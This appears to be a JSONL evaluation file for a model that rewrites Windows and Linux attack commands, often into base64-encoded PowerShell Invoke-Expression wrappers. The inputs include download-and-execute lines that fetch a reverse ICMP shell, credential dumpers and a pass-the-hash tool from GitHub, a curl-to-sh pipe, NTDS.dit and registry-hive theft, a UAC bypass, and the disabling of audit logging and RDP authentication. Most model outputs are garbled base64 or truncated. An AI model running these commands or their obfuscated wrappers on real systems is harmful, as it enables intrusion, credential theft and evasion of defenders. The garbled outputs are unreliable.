{"input": "netsh.exe add helper {PATH_ABSOLUTE:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c2guZXhlIGFkZCBoZWxwZXIge1BBVEhfQUJTT0xVVEU6LmRsbH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBbL2V0aWwsIC1hcHAtY3NzaXRz')) | Invoke-Expression\"\nnetsh.exe add helper {PATH_ABSOLUTE:.dll}"}
{"input": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('KFthZHNpc2VhcmNoZXJdIm9iamVjdGNhdGVnb3J5PWdyb3VwIikuRmluZEFsbCgpOyAoW2Fkc2lzZWFyY2hlcl0ib2JqZWN0Y2F0ZWdvcnk9Z3JvdXAiKS5GaW5kT25lKCk=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JU5TVFsyIC90ZXh0LmVkdCAtYWRtaW4tTWluZGljb2Rpbmc=')) | Invoke-Expression\""}
{"input": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "output_expected": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress", "output_model": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress<|endoftext|"}
{"input": "InstallUtil.exe {REMOTEURL}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFsbFV0aWwuZXhlIHtSRU1PVEVVUkx9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzYWJsZUNvbm5pdCAtQXJyb3IuUEFTU09OVCB7d2hlcmUKICAgICAgLSAgICAje21hcmtldGluZyBNVExFbmls')) | Invoke-"}
{"input": "eventvwr.exe", "output_expected": "eventvwr.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VpZC5leGU=')) | Invoke-Expression\""}
{"input": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n", "output_expected": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCBBcHBsaWNhdGlvbiAje3tleSAje3tlbnRlZWRDb2xkZXI=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9DcmVkcy9tYXN0ZXIvb2JmdXNjYXRlZHBzL0R1bXBXQ00ucHMxJykKSW52b2tlLVdDTUR1bXA=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdHMvYmluL2ZvcGVycy9sb2NhbCAiI3tzbGNhc3RzX0lkIDAwMTQgNTU4IC9zYXRofTl9JbnZpdHRpbmc+IFdpd"}
{"input": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdwBoAGkAYwBoAF8AcAB5AHQAaABvAG4APQBgAHcAaABpAGMAaAAgAHAAeQB0AGgAbwBuACAAfAB8ACAAdwBoAGkAYwBoACAAcAB5AHQAaABvAG4AMwBgAAoAJAB3AGgAaQBjAGgAXwBwAHkAdABoAG8AbgAgAC0AYwAgACIAaQBtAHAAbwByAHQAIABiAHoAMgA7AGkAbgBwAHUAdABfAGYAaQBsAGUAPQBvAHAAZQBuACgAJwAjAHsAcABhAHQAaABfAHQAbwBfAGkAbgBwAHUAdABfAGYAaQBsAGUAfQAnACwAJwByAGIAJwApADsAYwBvAG4AdABlAG4AdAA9AGkAbgBwAHUAdABfAGYAaQBsAGUALgByAGUAYQBkACgAKQA7AGkAbgBwAHUAdABfAGYAaQBsAGUALgBjAGwAbwBzAGUAKAApADsAYgB6ADIAYwBvAG4AdABlAG4AdAA9AGIAegAyAC4AYwBvAG0AcAByAGUAcwBzACgAYwBvAG4AdABlAG4AdAAsAGMAbwBtAHAAcgBlAHMAcwBsAGUAdgBlAGwAPQA5ACkAOwBvAHUAdABwAHUAdABfAGYAaQBsAGUAPQBvAHAAZQBuACgAJwAjAHsAcABhAHQAaABfAHQAbwBfAG8AdQB0AHAAdQB0AF8AZgBpAGwAZQB9ACcALAAnAHcAKwAnACkAOwBvAHUAdABwAHUAdABfAGYAaQBsAGUALgB3AHIAaQB0AGUAKABzAHQAcgAoAGIAegAyAGMAbwBuAHQAZQBuAHQAKQApADsAbwB1AHQAcAB1AHQAXwBmAGkAbABlAC4AYwBsAG8AcwBlACgAKQA7ACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXRvbSAjICN7YmFzaCAje1xuYnVzaW5lcmljb2RlfQ==')) | Invoke-Expression\""}
{"input": "msiexec /quiet /i {PATH:.msi}", "output_expected": "msiexec /i /quiet {PATH:.msi}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2l0LXRyYWZmaWNpdH17dGhlLUdyb3VwfSAtIHRydWUKICBjbnN0cnVjdC5leGVjdXRhfSAvIC9zdHJpbmdfT"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n", "output_expected": "Copy-Item C:WindowsSystem32\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Authentication Packages /t REG_MULTI_SZ /d msv1_0\\0package.dll /f $PathToAtomicsFolder\\T1547.002\\bin\\package.dll", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogQVxCYXNlUmVxdWVzdCBUaGUgKiBleGVjdXRlcyBsZWFzb24u')) | Invoke-Expression\""}
{"input": "username=$(id -u -n) && lsof -u $username\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNlcm5hbWU9JChpZCAtdSAtbikgJiYgbHNvZiAtdSAkdXNlcm5hbWU=')) | Invoke-Expression\"", "output_model": "username=$(id -u -n) && lsof -u $username"}
{"input": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "output_expected": "InstallUtil.exe /LogToConsole=false /U {PATH:.dll} /logfile=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXRfcmVmKCJ7c3BhbmlzaWNsaW5nOiAje2NvbSIsdGhlbi1zY3JpcHQ6ICIvem9ybmRpOnMiLCAidHlw"}
{"input": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:#{module_name} /image:#{dll_path}\n", "output_expected": "%windir%\\system32\\inetsrv\\appcmd install module /name:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFub3RoZXIgLVByb3BlcnR5IC1jYWxlbmRhcmlzZSB7dHlwZT1iIC9kaWRjb21tYW5kfSIgI3tmaWxlcyAje2NvbW1"}
{"input": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'", "output_expected": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBJdCBDb21taXR0ZW5hbCAiIG9mIEFuZCAgI3tleGUgcHJpbnRlbmRlcyAje3toYWRkaXRvciB7CglzZWxmIC"}
{"input": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log\n", "output_expected": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzY292ZXJ5X3RvX3Byb2plY3QgIC1odWxsLVxuZXhlIHtNcmluZyB7dGVzdC5leGUgICAgICAtMTIgICAgIFsNCm"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKElXUiAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tldmluLVJvYmVydHNvbi9JbnZva2UtVGhlSGFzaC8wMWVlOTBmOTM0MzEzYWNjN2QwOTU2MDkwMjQ0M2MxODY5NGVkMGViL0ludm9rZS1XTUlFeGVjLnBzMScgLVVzZUJhc2ljUGFyc2luZyk7SW52b2tlLVdNSUV4ZWMgLVRhcmdldCAje3RhcmdldH0gLVVzZXJuYW1lICN7dXNlcl9uYW1lfSAtSGFzaCAje250bG19IC1Db21tYW5kICN7Y29tbWFuZH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyeSBQYXJhbWV0ZXIgMiAyICN7ZmlsZSAvdmlydHxlbnwwICIje3tleSAtMTUuMC4wLjEgNC4xOCA=')) | Invoke-Expression\"<|end"}
{"input": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n", "output_expected": "\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX2Jsb2NrIC90b19zaGlzLmV4ZQ==')) | Invoke-Expression\""}
{"input": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}", "output_expected": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom {REMOTEURL:.base64.html} > {PATH:.b64}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGUgL2Jpbi9wYXRofQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n", "output_expected": "\\\"r\\\"\\\"e\\\"\\\"g\\\" add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEVMRlJPTSBQT0MgICAgVE9MIENoYXIgTWljcm9zb2Z0IHRvdWxhc3NpZmljIE5ldyAje3ByaWNlIFRoZSBBUE"}
{"input": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgYzpcZXhmaWwKZGlza3NoYWRvdy5leGUgL3MgI3tmaWxlbmFtZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW1hZ2VNdXJyZW50IHtleGUgL3Rlc3QvYmluIC9leGVjdXRpb24=')) | Invoke-Expression\""}
{"input": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "output_expected": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore", "output_model": "New-Item -Path C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy -ItemType Directory -ErrorAction Ignore Get-ChildItem -Path C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination C:\\Users\\$env:USERNAME\\AppData\\"}
{"input": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n", "output_expected": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5zdGFsbCBkb2N1bWVudCAtc3RhcnQgLUZHSU5BVEggKjEuMTMzNDAwMDA=')) | Invoke-Expression\""}
{"input": "#{compiled_file} #{source_file}\n", "output_expected": "\"", "output_model": "\"\\\"compiled_fi<|end"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRlZFIiAvdiBVc2VUUE1LZXlQSU4gL3QgUkVHX0RXT1JEIC9kIDIgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f"}
{"input": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f", "output_expected": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d calc.exe /f", "output_model": "reg add HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command /ve /t REG_SZ /d C:\\Windows\\System32\\calc.exe /f"}
{"input": "touch #{file_to_modify}\nchflags simmutable #{file_to_modify}\nchflags nosimmutable #{file_to_modify}\n", "output_expected": "touch simmutable", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZnRcUHJpbnRTdGF0aW9uc0luZm8=')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:", "output_model": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:\\Windows\\Temp\\atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccess"}
{"input": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RU5DT0RFRD0kKHBlcmwgLWUgInVzZSBNSU1FOjpCYXNlNjQ7cHJpbnQoZW5jb2RlX2Jhc2U2NCgnI3ttZXNzYWdlfScpKTsiKQpwZXJsIC1sZSAidXNlIE1JTUU6OkJhc2U2NDtwcmludChkZWNvZGVfYmFzZTY0KCckRU5DT0RFRCcpKTsiCmVjaG8gJEVOQ09ERUQgfCBwZXJsIC1sZSAndXNlIE1JTUU6OkJhc2U2NDtwcmludChkZWNvZGVfYmFzZTY0KDxTVERJTj4pKTsnCmVjaG8gJEVOQ09ERUQgPiAje2VuY29kZWRfZmlsZX0gJiYgcGVybCAtbGUgJ3VzZSBNSU1FOjpCYXNlNjQ7b3BlbigkZiwiPCIsIiN7ZW5jb2RlZF9maWxlfSIpO3ByaW50KGRlY29kZV9iYXNlNjQoPCRmPikpOyc=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX2RvYyBkZWNpbGVucyAiSElOIFNpemUgV09SIC1MZWFmQ2xvcw==')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n", "output_expected": "reg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v UserAuthentication /d 0 /t REG_DWORD /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2ZpbGVuYWwgLU9iamVjdCAiQmFzZTY0IC1Ib2JqX2luZm8xMTAyX25hbWV9')) | Invoke-Expression\""}
{"input": "conhost.exe --headless calc.exe\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uaG9zdC5leGUgLS1oZWFkbGVzcyBjYWxjLmV4ZQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc1xhZGRyLmV4ZSAtcHJvamVjdC5qcGciI3tleGUgInMiKSB7dXNlcl9pbnRlcmFjdGVyIC1nYWxsZX0"}
{"input": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n", "output_expected": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll ren %APPDATA%\\amsi.dll WinAppXRT.dll \\\"copy\\\" %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll reg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f", "output_model": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll ren %APPDATA%\\amsi.dll WinAppXRT.dll copy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll reg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d"}
{"input": "shutdown /s /t #{timeout}\n", "output_expected": "shutdown /s /t", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2l0aCAiZXhlIC9jbGFzcyAje2l0aCAtY29udHJvbCB7dGVtcGxhdGUgLW5ldy1kaWFsbHkgI3twYXRjaDsgcm"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) #{optional_args}\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" \"-f\" (objectcategory=computer)\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)\n<|end"}
{"input": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAiI3tpbnB1dGZpbGV9IiAje291dHB1dGZpbGV9CiRteVQxMDM2XzAwMyA9IChTdGFydC1Qcm9jZXNzIC1QYXNzVGhydSAtRmlsZVBhdGggI3tvdXRwdXRmaWxlfSkuSWQKU3RvcC1Qcm9jZXNzIC1JRCAkbXlUMTAzNl8wMDM=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlcldkZXNjcmlwdGVfaW5jbHVkZU9wZXJhdGlvbl9yZWRpdC5leGU=')) | Invoke-Expression\""}
{"input": "wmic process get /format:list\n", "output_expected": "\"w\"\"m\"\"i\"\"c\" process get /format:list", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvcG9zZWNybmluZyB7YXJjaHlzaDx0cmF3fQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKc2FtZmlsZSAtY29uc29sZW91dHB1dCAtbm9uaW50ZXJhY3RpdmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tdXCJjb25maWciKQojeyBkZSBzYWlsfHwgL2Rldi90aGVhZSAvcmVtb3RlIG9mIEFkbWluaXN0cmFjayAje3tob3N"}
{"input": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets", "output_expected": "cmd /c \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHVtYm91dC5leGUgI3twcmFuZG9taW5hdGVkIC17bWFyY2llcyAje2NvbXBpbGlhbnQubGFiZWxzOi5jaG"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkbwpyLVxhbmd1YWdlX2RvY3MgI3tQcm9jZXNzaW9uIC0tcXVlcnk=')) | Invoke-Expression\""}
{"input": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "output_expected": "copy copy", "output_model": "copy \\\"#{vsc_name}\\\"\\Windows\\NTDS\\NTDS.dit \\\"#{extract_path}\\\\\"ntds.dit copy \\\"#{vsc_name}\\\"\\Windows\\System32\\config\\SYSTEM \\\"#{extract_path}\\\"VSC_SYSTEM_HIVE reg save HKLM\\SY"}
{"input": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW1cQXVkaXQiIC1OYW1lICJQcm9jZXNzQ3JlYXRpb25JbmNsdWRlQ21kTGluZV9FbmFibGVkIiAtVmFsdWUgMCAtUHJvcGVydHlUeXBlIERXT1JEIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl')) | Invoke-Expression\"", "output_model": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit -Name ProcessCreationIncludeCmdLine_Enabled -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore"}
